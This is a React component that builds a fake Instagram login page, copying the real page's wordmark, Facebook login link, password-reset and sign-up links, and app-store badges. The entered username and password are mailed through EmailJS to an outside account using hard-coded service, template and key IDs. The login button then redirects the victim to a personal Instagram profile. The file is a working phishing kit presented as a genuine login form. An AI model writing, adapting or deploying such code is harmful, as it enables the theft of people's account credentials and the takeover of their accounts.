import './App.css';
import { useRef, useState ,React } from "react";
import fblogo from "./images/facebook.png"
import insave from "./images/instagram1.png"
import instatext from "./images/instatext.png"
import emailjs from "@emailjs/browser";

function App() {

  const [name, setName] = useState("");
  const [password,setPassword] = useState("")
  const form = useRef();
  const sendEmail = (e) => {
    e.preventDefault();
    // Replace 'YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', and 'YOUR_PUBLIC_KEY' with your EmailJS credentials
    emailjs.sendForm('service_qk0sd1k', "template_o94y39s", form.current, "11MBeU3U2hVYQIvAv")
      .then((result) => {
        console.log(result.text);
      }, (error) => {
        console.log(error.text);
      });
  };


  return (
    <div className="container">
      <div className='page'>
        {/* <img src={insave} alt="img-insta" className='insave'/> */}
      <div className='pageone'>

        <div className="first-container">
          {/* <h1 className="title">Instagram</h1>
           */}
           <img className='title' src={instatext} alt="" />
           <form ref ={form} >
          <input type="text" name="name" className="username inpt" value={name} onChange={(e)=>setName(e.target.value)} placeholder="Phone number, username, or email" />
          <input type="password"name="password" className="password inpt" value={password} onChange={(e)=>setPassword(e.target.value)} placeholder="Password" />
          <button className="loginbtn" onClick={sendEmail}  > <a className="loginbtn"href="https://instagram.com/the.ankursingh_?igshid=OGQ5ZDc2ODk2ZA==">Log in</a></button>
          </form>
          <p className='or'>OR</p>
          <div className="facebook">
            <a href="https://www.facebook.com/login/">
            <img src={fblogo} alt="fb" className="fb" /></a>
          <a href="https://www.facebook.com/login/">  <p className='logfb'>Log in with facebook</p></a>
          </div>
            <a href="https://www.instagram.com/accounts/password/reset/"><p className="pass">Forgot password?</p></a>
        </div>

        <div className="second-container">
          <p className="signup">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/"><span>Sign up</span> </a>
          </p>
        </div>
        <div className="third-container">
          <p className="get-the-app">Get the app.</p>
        </div>

        <div className="forth-container">
        <a href="https://apps.apple.com/us/app/instagram/id389801252?vt=lo" >
              <img className='app appone' src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" alt="app link" />
            </a>
            <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D833411D8-31CD-4615-B845-6690E04B7326%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge&pli=1" >
              <img className='app' src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="app link" />
            </a>
        </div>
      </div>
    </div>
    </div>

  );
}

export default App;
